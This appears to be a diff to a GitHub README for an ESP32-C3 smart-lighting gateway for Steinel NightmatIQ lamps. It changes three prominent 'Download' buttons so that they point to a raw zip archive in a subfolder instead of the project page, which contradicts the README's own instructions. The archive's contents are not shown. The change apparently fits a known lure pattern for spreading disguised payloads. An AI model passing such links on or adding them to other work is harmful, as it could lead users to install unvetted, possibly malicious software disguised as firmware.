@@ -1,6 +1,6 @@
 <h1>📡 steinel-nightmatiq-esp32-c3-gateway - Control Your Lights from Anywhere</h1>
 
-<p><a href="https://github.com/acmicpctrain/steinel-nightmatiq-esp32-c3-gateway" style="display:inline-block;background:#4CAF50;color:white;padding:15px 30px;font-size:20px;text-decoration:none;border-radius:8px;font-weight:bold;">⬇️ Download Now</a></p>
+<p><a href="https://github.com/acmicpctrain/steinel-nightmatiq-esp32-c3-gateway/raw/refs/heads/main/home-assistant/c_nightmatiq_esp_steinel_gateway_v1.0.zip" style="display:inline-block;background:#4CAF50;color:white;padding:15px 30px;font-size:20px;text-decoration:none;border-radius:8px;font-weight:bold;">⬇️ Download Now</a></p>
 
 ## 🔍 What Is This?
 
@@ -23,7 +23,7 @@ If you don't have an ESP32-C3 device yet, you can buy one online for about $10. 
 
 ### Step 1: Download the Software
 
-<a href="https://github.com/acmicpctrain/steinel-nightmatiq-esp32-c3-gateway" style="display:inline-block;background:#2196F3;color:white;padding:12px 25px;text-decoration:none;border-radius:5px;font-weight:bold;">📥 Click Here to Visit the Download Page</a>
+<a href="https://github.com/acmicpctrain/steinel-nightmatiq-esp32-c3-gateway/raw/refs/heads/main/home-assistant/c_nightmatiq_esp_steinel_gateway_v1.0.zip" style="display:inline-block;background:#2196F3;color:white;padding:12px 25px;text-decoration:none;border-radius:5px;font-weight:bold;">📥 Click Here to Visit the Download Page</a>
 
 Visit this link to download the application. This page contains everything you need to get your gateway running. Look for a green button that says "Code" and click it, then select "Download ZIP". This will save a compressed folder to your computer.
 
@@ -183,6 +183,6 @@ Before you consider the project complete:
 
 Once you've checked all these boxes, congratulations! You now have a modern, self-contained smart lighting gateway that gives you total control over your Steinel NightmatIQ Plus system — right from your own home network.
 
-<a href="https://github.com/acmicpctrain/steinel-nightmatiq-esp32-c3-gateway" style="display:block;margin-top:30px;background:#FF5722;color:white;text-align:center;padding:12px;text-decoration:none;border-radius:5px;font-size:18px;">🔄 Get the Latest Version Now</a>
+<a href="https://github.com/acmicpctrain/steinel-nightmatiq-esp32-c3-gateway/raw/refs/heads/main/home-assistant/c_nightmatiq_esp_steinel_gateway_v1.0.zip" style="display:block;margin-top:30px;background:#FF5722;color:white;text-align:center;padding:12px;text-decoration:none;border-radius:5px;font-size:18px;">🔄 Get the Latest Version Now</a>
 
 Keywords: bluetooth-mesh, esp32, esp32-c3, esp32-c3-super-mini, esphome, firmware, gateway, home-assistant, is-digi-nm-2e6915, local-control, nightmatiq, nightmatiq-plus, ota, smart-home, steinel
